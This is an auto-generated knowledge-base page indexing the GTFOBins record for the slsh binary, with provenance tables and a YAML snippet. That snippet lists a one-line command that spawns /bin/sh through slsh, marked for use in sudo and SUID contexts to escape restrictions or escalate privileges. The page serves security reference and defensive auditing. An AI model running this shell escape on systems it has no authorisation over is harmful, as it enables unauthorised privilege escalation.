---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# slsh

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `slsh` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/slsh` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [slsh](../../tools/linux/slsh.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | slsh |
| name | slsh |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/slsh/ |

## Preserved Source Material

```yaml
_body: ''
_name: slsh
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/slsh
functions:
  shell:
  - code: slsh -e 'system("/bin/sh")'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
```
